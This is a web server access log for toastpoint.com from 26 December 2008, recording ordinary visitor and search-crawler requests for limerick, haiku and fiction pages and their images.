98.221.11.240 - - [26/Dec/2008:00:02:02 -0500] "GET /limerick/naut199.html HTTP/1.1" 200 34481 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; MS-RTC LM 8; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; MS-RTC EA 2)"
98.221.11.240 - - [26/Dec/2008:00:02:02 -0500] "GET /gifs/boobies.gif HTTP/1.1" 200 11144 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; MS-RTC LM 8; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; MS-RTC EA 2)"
98.221.11.240 - - [26/Dec/2008:00:02:02 -0500] "GET /gifs/goldstar.jpg HTTP/1.1" 200 1854 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; MS-RTC LM 8; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; MS-RTC EA 2)"
98.221.11.240 - - [26/Dec/2008:00:02:02 -0500] "GET /gifs/nakedman.gif HTTP/1.1" 200 7734 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; MS-RTC LM 8; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; MS-RTC EA 2)"
66.249.72.35 - - [26/Dec/2008:00:05:01 -0500] "GET /limerick/brady/brady99.html HTTP/1.1" 200 7546 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:00:05:05 -0500] "GET /limerick/1995/nicesept.html HTTP/1.1" 200 3676 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:00:21:00 -0500] "GET /limerick/1995/bestnice.html HTTP/1.1" 200 6154 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
64.1.215.164 - - [26/Dec/2008:00:50:03 -0500] "GET /haiku/1996/haiku596.html HTTP/1.0" 200 9379 "-" "Mozilla/5.0 (Twiceler-0.9 http://www.cuil.com/twiceler/robot.html)"
71.201.40.20 - - [26/Dec/2008:00:53:47 -0500] "GET /gifs/boobies.gif HTTP/1.1" 200 11144 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; en) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22"
71.201.40.20 - - [26/Dec/2008:00:53:47 -0500] "GET /gifs/nakedman.gif HTTP/1.1" 200 7734 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; en) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22"
71.201.40.20 - - [26/Dec/2008:00:53:47 -0500] "GET /gifs/goldstar.jpg HTTP/1.1" 200 1854 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; en) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22"
71.201.40.20 - - [26/Dec/2008:00:53:47 -0500] "GET /limerick/naut199.html HTTP/1.1" 200 34481 "http://www.google.com/search?client=safari&rls=en&q=naughty+limericks&ie=UTF-8&oe=UTF-8" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; en) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22"
71.201.40.20 - - [26/Dec/2008:00:53:48 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; en) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22"
72.30.65.29 - - [26/Dec/2008:01:33:12 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
72.30.65.29 - - [26/Dec/2008:01:33:14 -0500] "GET /links.html HTTP/1.0" 200 4252 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
67.202.43.229 - - [26/Dec/2008:01:51:18 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)"
67.202.43.229 - - [26/Dec/2008:01:51:18 -0500] "GET /fiction/fict299.html HTTP/1.0" 200 38635 "-" "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)"
67.202.43.229 - - [26/Dec/2008:01:51:23 -0500] "GET /fiction/novels/rosalind.html HTTP/1.0" 200 30989 "-" "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)"
67.202.43.229 - - [26/Dec/2008:01:51:29 -0500] "GET /limerick/docs/fletcher.html HTTP/1.0" 200 5576 "-" "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)"
66.249.72.35 - - [26/Dec/2008:02:24:32 -0500] "GET /limerick/1995/niceoct.html HTTP/1.1" 200 5007 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
81.52.143.15 - - [26/Dec/2008:02:59:35 -0500] "GET /limerick/nice599.html HTTP/1.1" 200 26033 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
66.235.124.8 - - [26/Dec/2008:03:00:22 -0500] "GET /robots.txt HTTP/1.1" 404 693 "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
66.235.124.8 - - [26/Dec/2008:03:00:27 -0500] "GET / HTTP/1.1" 200 464 "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
66.235.124.8 - - [26/Dec/2008:03:00:27 -0500] "GET /toastpointtopleft.html HTTP/1.1" 200 162 "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
66.235.124.8 - - [26/Dec/2008:03:00:27 -0500] "GET /toastpointtoc.html HTTP/1.1" 200 1188 "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
66.235.124.8 - - [26/Dec/2008:03:00:27 -0500] "GET /news.html HTTP/1.1" 200 17706 "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
66.235.124.8 - - [26/Dec/2008:03:00:27 -0500] "GET /toastpointtopright.html HTTP/1.1" 200 151 "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
66.235.124.8 - - [26/Dec/2008:03:00:27 -0500] "GET /tpnews.html HTTP/1.1" 200 8305 "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
81.52.143.15 - - [26/Dec/2008:03:16:54 -0500] "GET /limerick/naut199.html HTTP/1.1" 200 34481 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
121.45.115.22 - - [26/Dec/2008:03:28:10 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
208.111.154.15 - - [26/Dec/2008:03:36:21 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (compatible; Charlotte/1.1; http://www.searchme.com/support/)"
125.164.243.8 - - [26/Dec/2008:04:07:11 -0500] "GET http://www.toastpoint.com/ HTTP/1.0" 200 464 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)"
72.36.115.86 - - [26/Dec/2008:05:18:42 -0500] "GET /haiku/haiku599.html HTTP/1.1" 200 33918 "-" "CazoodleBot/0.0.2 (http://www.cazoodle.com/contact.php; cbot@cazoodle.com)"
63.241.3.51 - - [26/Dec/2008:05:33:43 -0500] "GET /limerick/limerick.html HTTP/1.1" 200 2613 "-" "-"
193.252.149.15 - - [26/Dec/2008:05:36:40 -0500] "GET /haiku/haikufrm.html HTTP/1.1" 200 534 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
193.252.149.15 - - [26/Dec/2008:05:38:51 -0500] "GET /haiku/haiku199.html HTTP/1.1" 200 34287 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.26 - - [26/Dec/2008:06:04:03 -0500] "GET /robots.txt HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.26 - - [26/Dec/2008:06:04:11 -0500] "GET /haiku/moral.html HTTP/1.1" 200 4692 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
193.252.149.15 - - [26/Dec/2008:06:05:51 -0500] "GET /limerick/1996/lim1996.html HTTP/1.1" 200 2072 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
216.183.81.221 - - [26/Dec/2008:06:20:48 -0500] "GET / HTTP/1.1" 304 - "-" "Wget/1.10.2"
123.243.122.202 - - [26/Dec/2008:06:22:33 -0500] "GET /gifs/nakedman.gif HTTP/1.1" 200 7734 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_4_11; en) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
123.243.122.202 - - [26/Dec/2008:06:22:33 -0500] "GET /gifs/boobies.gif HTTP/1.1" 200 11144 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_4_11; en) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
123.243.122.202 - - [26/Dec/2008:06:22:33 -0500] "GET /gifs/goldstar.jpg HTTP/1.1" 200 1854 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_4_11; en) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
123.243.122.202 - - [26/Dec/2008:06:22:32 -0500] "GET /limerick/naut199.html HTTP/1.1" 200 34481 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_4_11; en) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
81.52.143.15 - - [26/Dec/2008:06:24:33 -0500] "GET /limerick/1996/naut596.html HTTP/1.1" 200 28755 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
74.6.23.230 - - [26/Dec/2008:06:38:55 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.76.45 - - [26/Dec/2008:06:38:55 -0500] "GET / HTTP/1.0" 200 464 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.76.45 - - [26/Dec/2008:06:38:56 -0500] "GET /toastpointtopleft.html HTTP/1.0" 200 162 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.76.45 - - [26/Dec/2008:06:38:57 -0500] "GET /toastpointtoc.html HTTP/1.0" 200 1188 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.76.45 - - [26/Dec/2008:06:38:58 -0500] "GET /news.html HTTP/1.0" 200 17706 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.76.45 - - [26/Dec/2008:06:38:59 -0500] "GET /toastpointtopright.html HTTP/1.0" 200 151 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.76.45 - - [26/Dec/2008:06:39:00 -0500] "GET /tpnews.html HTTP/1.0" 200 8305 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
63.241.3.51 - - [26/Dec/2008:06:39:33 -0500] "GET /limerick/limerick.html HTTP/1.1" 200 2613 "-" "-"
193.252.149.15 - - [26/Dec/2008:06:49:25 -0500] "GET /limerick/nice199.html HTTP/1.1" 200 25313 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.16 - - [26/Dec/2008:06:55:50 -0500] "GET /haiku/haiku.html HTTP/1.1" 200 2147 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.15 - - [26/Dec/2008:06:57:19 -0500] "GET /limerick/nice399.html HTTP/1.1" 200 31092 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
193.252.149.16 - - [26/Dec/2008:07:10:45 -0500] "GET /limerick/naut499.html HTTP/1.1" 200 38163 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
72.36.115.86 - - [26/Dec/2008:07:12:36 -0500] "GET /haiku/1996/haiku396.html HTTP/1.1" 200 17896 "-" "CazoodleBot/0.0.2 (http://www.cazoodle.com/contact.php; cbot@cazoodle.com)"
68.221.113.209 - - [26/Dec/2008:07:20:32 -0500] "GET /haiku/haiku399.html HTTP/1.1" 200 75208 "http://search.yahoo.co.jp/search?p=issa%2C++don%27t+worry%2C+spiders&ei=UTF-8&qrw=0&pstart=1&fr=top_ga1&b=81" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)"
68.221.113.209 - - [26/Dec/2008:07:20:33 -0500] "GET /gifs/japan.gif HTTP/1.1" 200 5737 "http://www.toastpoint.com/haiku/haiku399.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)"
68.221.113.209 - - [26/Dec/2008:07:20:34 -0500] "GET /gifs/goldstar.jpg HTTP/1.1" 200 1854 "http://www.toastpoint.com/haiku/haiku399.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)"
68.221.113.209 - - [26/Dec/2008:07:20:34 -0500] "GET /gifs/blank.jpg HTTP/1.1" 200 705 "http://www.toastpoint.com/haiku/haiku399.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)"
68.221.113.209 - - [26/Dec/2008:07:20:35 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)"
193.252.149.16 - - [26/Dec/2008:07:28:40 -0500] "GET /haiku/haiku399.html HTTP/1.1" 200 75208 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
125.120.89.25 - - [26/Dec/2008:07:32:41 -0500] "GET / HTTP/1.1" 200 464 "-" "-"
81.52.143.15 - - [26/Dec/2008:07:37:35 -0500] "GET /limerick/1998/nice598.html HTTP/1.1" 200 45520 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
119.63.194.130 - - [26/Dec/2008:08:14:54 -0500] "GET / HTTP/1.1" 304 - "-" "Baiduspider+(+http://help.baidu.jp/system/05.html)"
72.36.115.86 - - [26/Dec/2008:08:19:40 -0500] "GET /limerick/brady/brady1.html HTTP/1.1" 200 4493 "-" "CazoodleBot/0.0.2 (http://www.cazoodle.com/contact.php; cbot@cazoodle.com)"
81.52.143.15 - - [26/Dec/2008:09:03:07 -0500] "GET /fiction/fict599.html HTTP/1.1" 200 7512 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
71.224.7.208 - - [26/Dec/2008:09:07:30 -0500] "GET /limerick/naut199.html HTTP/1.1" 200 34481 "http://www.google.com/search?hl=en&q=there+once+was+a+girl+named+Monica&btnG=Google+Search&aq=f&oq=" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1"
71.224.7.208 - - [26/Dec/2008:09:07:30 -0500] "GET /gifs/goldstar.jpg HTTP/1.1" 200 1854 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1"
71.224.7.208 - - [26/Dec/2008:09:07:30 -0500] "GET /gifs/boobies.gif HTTP/1.1" 200 11144 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1"
71.224.7.208 - - [26/Dec/2008:09:07:30 -0500] "GET /gifs/nakedman.gif HTTP/1.1" 200 7734 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1"
71.224.7.208 - - [26/Dec/2008:09:07:30 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1"
216.183.81.221 - - [26/Dec/2008:09:10:36 -0500] "GET / HTTP/1.1" 304 - "-" "Wget/1.10.2"
72.36.115.86 - - [26/Dec/2008:09:45:14 -0500] "GET /welcome.html HTTP/1.1" 200 418 "-" "CazoodleBot/0.0.2 (http://www.cazoodle.com/contact.php; cbot@cazoodle.com)"
64.233.160.136 - - [26/Dec/2008:09:45:49 -0500] "GET /googlehostedservice.html HTTP/1.0" 404 693 "-" "Jakarta Commons-HttpClient/3.0.1"
64.233.160.136 - - [26/Dec/2008:09:45:49 -0500] "GET /googlehostedservice.html HTTP/1.0" 404 693 "-" "Jakarta Commons-HttpClient/3.0.1"
38.98.19.67 - - [26/Dec/2008:10:14:46 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Snapbot/1.0 (Snap Shots, +http://www.snap.com)"
38.98.19.68 - - [26/Dec/2008:10:14:46 -0500] "GET / HTTP/1.0" 200 464 "-" "Snapbot/1.0 (Snap Shots, +http://www.snap.com)"
208.80.194.41 - - [26/Dec/2008:10:21:29 -0500] "GET / HTTP/1.0" 200 464 "-" "Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Windows NT 5.1; Roadrunner; SV1)"
193.252.149.16 - - [26/Dec/2008:10:32:00 -0500] "GET /limerick/limerick.html HTTP/1.1" 200 2613 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
66.249.72.35 - - [26/Dec/2008:10:48:23 -0500] "GET /robots.txt HTTP/1.1" 404 693 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:10:48:23 -0500] "GET /fiction/fict97/fict97.html HTTP/1.1" 200 1536 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:10:49:11 -0500] "GET /robots.txt HTTP/1.1" 404 693 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:10:49:11 -0500] "GET /fiction/fict98/fict98.html HTTP/1.1" 200 1540 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
67.195.37.167 - - [26/Dec/2008:10:52:28 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
67.195.37.167 - - [26/Dec/2008:10:52:28 -0500] "GET /haiku/haiku.html HTTP/1.0" 200 2147 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
66.249.72.35 - - [26/Dec/2008:10:56:32 -0500] "GET /limerick/1995/nautsept.html HTTP/1.1" 200 7977 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:10:57:44 -0500] "GET /limerick/1995/nautmay.html HTTP/1.1" 200 4260 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:10:57:45 -0500] "GET /fiction/fict98/fict98.html HTTP/1.1" 200 1540 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
189.11.112.206 - - [26/Dec/2008:10:58:58 -0500] "GET / HTTP/1.1" 200 464 "http://www.google.com.br/search?hl=pt-BR&q=Point+Page&meta=&aq=f&oq=" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; InfoPath.2; .NET CLR 2.0.50727)"
189.11.112.206 - - [26/Dec/2008:10:58:58 -0500] "GET /toastpointtopleft.html HTTP/1.1" 200 162 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; InfoPath.2; .NET CLR 2.0.50727)"
189.11.112.206 - - [26/Dec/2008:10:58:59 -0500] "GET /toastpointtoc.html HTTP/1.1" 200 1188 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; InfoPath.2; .NET CLR 2.0.50727)"
189.11.112.206 - - [26/Dec/2008:10:58:59 -0500] "GET /tpnews.html HTTP/1.1" 200 8305 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; InfoPath.2; .NET CLR 2.0.50727)"
189.11.112.206 - - [26/Dec/2008:10:59:01 -0500] "GET /news.html HTTP/1.1" 200 17706 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; InfoPath.2; .NET CLR 2.0.50727)"
189.11.112.206 - - [26/Dec/2008:10:59:01 -0500] "GET /toastpointtopright.html HTTP/1.1" 200 151 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; InfoPath.2; .NET CLR 2.0.50727)"
189.11.112.206 - - [26/Dec/2008:10:59:03 -0500] "GET /gifs/tpwinter20089.jpg HTTP/1.1" 200 28088 "http://www.toastpoint.com/news.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; InfoPath.2; .NET CLR 2.0.50727)"
66.249.85.84 - - [26/Dec/2008:10:59:14 -0500] "GET / HTTP/1.1" 200 464 "http://translate.google.com.br/translate?hl=pt-BR&sl=en&u=http://www.toastpoint.com/&sa=X&oi=translate&resnum=4&ct=result&prev=/search%3Fq%3DPoint%2BPage%26hl%3Dpt-BR" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; InfoPath.2; .NET CLR 2.0.50727),gzip(gfe) (via translate.google.com)"
66.235.124.8 - - [26/Dec/2008:11:14:08 -0500] "GET /haiku/1998/haiku198.html HTTP/1.1" 200 25922 "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
64.1.215.164 - - [26/Dec/2008:11:19:43 -0500] "GET /haiku/1995/haikunov.html HTTP/1.0" 200 12211 "-" "Mozilla/5.0 (Twiceler-0.9 http://www.cuil.com/twiceler/robot.html)"
72.129.238.193 - - [26/Dec/2008:11:37:40 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)"
72.129.238.193 - - [26/Dec/2008:11:37:40 -0500] "GET / HTTP/1.1" 200 464 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)"
72.129.238.193 - - [26/Dec/2008:11:37:40 -0500] "GET /toastpointtopleft.html HTTP/1.1" 200 162 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)"
72.129.238.193 - - [26/Dec/2008:11:37:40 -0500] "GET /news.html HTTP/1.1" 200 17706 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)"
72.129.238.193 - - [26/Dec/2008:11:37:40 -0500] "GET /toastpointtoc.html HTTP/1.1" 200 1188 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)"
72.129.238.193 - - [26/Dec/2008:11:37:40 -0500] "GET /toastpointtopright.html HTTP/1.1" 200 151 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)"
72.129.238.193 - - [26/Dec/2008:11:37:40 -0500] "GET /tpnews.html HTTP/1.1" 200 8305 "http://www.toastpoint.com/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)"
